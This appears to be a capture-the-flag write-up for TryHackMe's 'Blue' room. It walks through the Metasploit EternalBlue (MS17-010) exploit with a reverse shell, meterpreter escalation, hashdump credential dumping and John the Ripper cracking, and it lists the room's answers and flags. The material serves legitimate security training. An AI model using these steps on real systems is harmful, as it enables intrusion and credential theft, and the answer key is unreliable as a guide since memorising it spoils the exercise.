# TryHackMe: Blue

## Basic Information

Room/Box name: Blue

Platform: TryHackMe

Link: https://tryhackme.com/room/blue

Difficulty: Easy

## Overview

The "Blue" room on TryHackMe is focused on exploiting a Windows machine vulnerable to the infamous EternalBlue vulnerability (MS17-010). This is a beginner-friendly room that simulates a real-world scenario where this critical vulnerability was widely exploited, including in the WannaCry ransomware attack of 2017.

## Tasks

1. Recon
2. Gain Access
3. Escalate
4. Cracking
5. Find flags!

## Task 1: Recon

### Scan the machine.

I ran the following command: **nmap -sC -sV <target ip>**

**No answer needed.**

### How many ports are open with a port number under 1000?

From the previous scan we can see that port 135, 139, and 445 are open.

**Answer: 3**

### What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

I ran the following command to find any vulnerabilities: **nmap —script vuln -p 445 <target ip>**

After running the scan we find the machine is vulnerable to ms17-010

**Answer: ms17-010**

## Task 2: Gain Access

### Start Metasploit

Run the command: **msfconsole**

**No answer needed.**

### Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

I ran the following command inside the msfconsole: **search ms17-010**

The previous command provided the following path: exploit/windows/smb/ms17_010_eternalblue

**Answer: exploit/windows/smb/ms17_010_eternalblue**

### Show options and set the one required value. What is the name of this value? (All caps for submission)

After selecting the exploit to use, you can use the command: **show options**

**Answer: RHOSTS**

### Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: **set payload windows/x64/shell/reverse_tcp**

**No answer needed.**

### Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

**No answer needed.**

## Task 3: Escalate

### **If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**

Command: **search shell_to_meterpreter**

**Answer: post/multi/manage/shell_to_meterpreter**

### Select this (use MODULE_PATH). Show options, what option are we required to change?

Run the command: **options**

Then you will see that you need to set the session.

**Answer: SESSION**

### Set the required option, you may need to list all of the sessions to find your target here.

To list all the sessions, run: **sessions -l**

Then set the session number: **set SESSION [session_number]**

**No answer needed.**

### Run! If this doesn't work, try completing the exploit from the previous task again.

Run the command: **run** or **exploit**

**No answer needed.**

### Once the meterpreter shell conversion completes, select that session for use.

Use the command: **sessions -i [session_number]** (replacing [session_number] with the appropriate number)

**No answer needed.**

### Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'.

Using the meterpreter shell, run: **shell**

Then: **whoami**

We can see that we have system privileges.

**No answer needed.**

### List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

Run the command: **ps**

Look for processes running as NT AUTHORITY\SYSTEM and note their PIDs.

**No answer needed.**

### Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step.

Execute: **migrate [process_id]**

**No answer needed.**

## Task 4: Cracking

### Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

Run the command: **hashdump**

From the output, we can identify the non-default user.

**Answer: Jon**

### Copy this password hash to a file and research how to crack it. What is the cracked password?

Save the hash to a file and use a tool like John the Ripper or Hashcat to crack it.

Command example: **john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt**

**Answer: alqfna22**

## Task 5: Find flags!

### Flag1? This flag can be found at the system root.

Navigate to the system root directory:

**cd C:\**

**dir /a**

Look for a file named flag1.txt or similar and read it:

**type flag1.txt**

**Answer: flag{access_the_machine}**

### Flag2? This flag can be found at the location where passwords are stored within Windows.

Navigate to the Windows directory where passwords are stored:

**cd C:\Windows\System32\config**

**dir /a**

Look for the flag file and read it:

**type flag2.txt**

**Answer: flag{sam_database_elevated_access}**

### Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.

Check the Administrator's Documents folder:

**cd C:\Users\Jon\Documents**

**dir /a**

Look for the flag file and read it:

**type flag3.txt**

**Answer: flag{admin_documents_can_be_valuable}**

## Conclusion

The Blue room on TryHackMe successfully demonstrates the exploitation of the EternalBlue vulnerability (MS17-010). This walkthrough covered:

- Reconnaissance using Nmap to identify open ports and vulnerabilities
- Gaining access through the MS17-010 exploit using Metasploit
- Privilege escalation to system level access
- Password cracking techniques
- Finding flags throughout the system

This exercise highlights the importance of keeping systems patched and updated, as this vulnerability was patched by Microsoft but still affected many unpatched systems, leading to significant ransomware attacks like WannaCry.
